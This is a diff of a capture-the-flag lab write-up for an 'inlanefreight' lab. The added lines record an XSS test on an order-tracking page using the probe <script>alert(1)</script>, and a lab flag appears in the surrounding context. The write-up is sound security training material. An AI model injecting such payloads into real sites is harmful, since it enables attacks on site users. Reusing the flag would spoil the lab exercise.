@@ -1038,7 +1038,19 @@ HTB{1nS3cuR3_c00k135}
 
 ## tracking.inlanefreight.local
 
+The only functionality of the page is to track an order by putting its id in the field and clicking track now:
+
 ![](./vhosts/tracking/tracking1.png)
+
+![](./vhosts/tracking/tracking2.png)
+
+by testing a simple xss payload
+
+<script>alert(1)</script>
+
+its possible to notice that the page executes that javascript instead of rendering it as text (the field Tracking # is now empty):
+
+![](./vhosts/tracking/tracking4.png)
 
 ```javascript
 <script>
